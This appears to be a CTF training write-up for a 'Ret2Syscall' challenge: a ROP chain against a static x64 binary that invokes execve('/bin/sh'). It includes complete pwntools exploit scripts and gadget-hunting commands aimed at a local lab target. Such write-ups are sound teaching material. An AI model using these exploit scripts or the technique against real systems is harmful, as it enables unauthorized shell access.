# Challenge 11: Ret2Syscall

## Difficulty: Medium-Hard

## Vulnerability Type: ROP to Syscall

## Description
Statically compiled binary with no useful libc functions. Must use ROP to invoke syscall directly to get a shell.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **Static**: Yes (lots of gadgets!)
- **RELRO**: Partial

## Vulnerability Analysis

### No Useful Functions
```c
// Only uses: read(), write()
// No system(), execve(), etc. in dynamic linking
```

### Static Binary
Statically linked binaries contain all libc code, giving us TONS of ROP gadgets.

## Exploitation Strategy

### Goal: Execute execve("/bin/sh", NULL, NULL)

Syscall number for execve: 59 (0x3b)

Required register setup:
- RAX = 59 (syscall number)
- RDI = pointer to "/bin/sh"
- RSI = NULL (argv)
- RDX = NULL (envp)
- Execute: `syscall` instruction

### Finding Gadgets
```bash
ROPgadget --binary challenge > gadgets.txt
```

We need:
- `pop rax; ret` - Set syscall number
- `pop rdi; ret` - Set filename pointer
- `pop rsi; ret` - Set argv
- `pop rdx; ret` - Set envp
- `syscall; ret` - Invoke syscall
- Writable memory for "/bin/sh" string

### Building the ROP Chain
```python
# Gadget addresses (find with ROPgadget)
pop_rax = # pop rax; ret
pop_rdi = # pop rdi; ret
pop_rsi = # pop rsi; ret
pop_rdx = # pop rdx; ret
syscall = # syscall; ret

# Data section for "/bin/sh"
binsh_addr = # writable memory (BSS)

# We need to write "/bin/sh" to memory first
# Option 1: It exists in binary (static builds often have it)
# Option 2: Use read() syscall to write it

# ROP chain
rop_chain = p64(pop_rax)
rop_chain += p64(59)              # execve syscall
rop_chain += p64(pop_rdi)
rop_chain += p64(binsh_addr)      # /bin/sh pointer
rop_chain += p64(pop_rsi)
rop_chain += p64(0)               # argv = NULL
rop_chain += p64(pop_rdx)
rop_chain += p64(0)               # envp = NULL
rop_chain += p64(syscall)         # execve("/bin/sh", NULL, NULL)
```

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9011)
else:
    p = process('./challenge')

# Find gadgets using pwntools ROP
rop = ROP(elf)

pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]

log.info(f"pop rax: {hex(pop_rax)}")
log.info(f"pop rdi: {hex(pop_rdi)}")
log.info(f"pop rsi: {hex(pop_rsi)}")
log.info(f"pop rdx: {hex(pop_rdx)}")
log.info(f"syscall: {hex(syscall_ret)}")

# Find "/bin/sh" string or writable memory
try:
    binsh = next(elf.search(b'/bin/sh\x00'))
    log.info(f"/bin/sh found at: {hex(binsh)}")
except:
    # Use BSS
    binsh = elf.bss() + 0x100
    log.warning(f"Using BSS for /bin/sh: {hex(binsh)}")
    # Would need to write it first with read() syscall

offset = 136

# Build ROP chain for execve("/bin/sh", NULL, NULL)
payload = b'A' * offset
payload += p64(pop_rax)
payload += p64(59)          # __NR_execve
payload += p64(pop_rdi)
payload += p64(binsh)       # filename
payload += p64(pop_rsi)
payload += p64(0)           # argv
payload += p64(pop_rdx)
payload += p64(0)           # envp
payload += p64(syscall_ret) # execve()

p.sendafter(b'Payload: ', payload)
p.interactive()
```

### Using pwntools ROP Automation
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

p = process('./challenge')

# Pwntools can auto-build syscall ROP
rop = ROP(elf)

# Find /bin/sh
binsh = next(elf.search(b'/bin/sh\x00'))

# Build syscall chain
rop.execve(binsh, 0, 0)

log.info(rop.dump())

offset = 136
payload = b'A' * offset
payload += rop.chain()

p.sendafter(b'Payload: ', payload)
p.interactive()
```

## Syscall Reference (x64 Linux)

Common syscalls:
- `execve`: RAX=59, RDI=filename, RSI=argv, RDX=envp
- `read`: RAX=0, RDI=fd, RSI=buf, RDX=count
- `write`: RAX=1, RDI=fd, RSI=buf, RDX=count
- `open`: RAX=2, RDI=filename, RSI=flags, RDX=mode

## Automated Detection
- **Static Binary**: Detected via `file` command
- **No System Function**: No easy ret2libc
- **Lots of Gadgets**: Static linking provides many gadgets
- **Syscall Gadget**: `syscall; ret` exists
- **Strategy**: Build ROP chain to invoke execve syscall

## Why Static Binaries?
Static binaries include all library code, giving attackers:
- More gadgets to work with
- No ASLR on binary code
- Predictable addresses

Modern practice: avoid static linking for security-sensitive programs.

## Learning Objectives
- Direct syscall invocation
- Linux syscall ABI (x64)
- Register setup for syscalls
- Static vs dynamic linking
- ROP in large binaries
- pwntools ROP automation

## Tools
```bash
# Find all syscall gadgets
ROPgadget --binary challenge | grep syscall

# Find specific register pops
ROPgadget --binary challenge | grep "pop rax"
ROPgadget --binary challenge | grep "pop rdx"

# Automated ROP chain
ropper --file challenge --chain "execve"
```
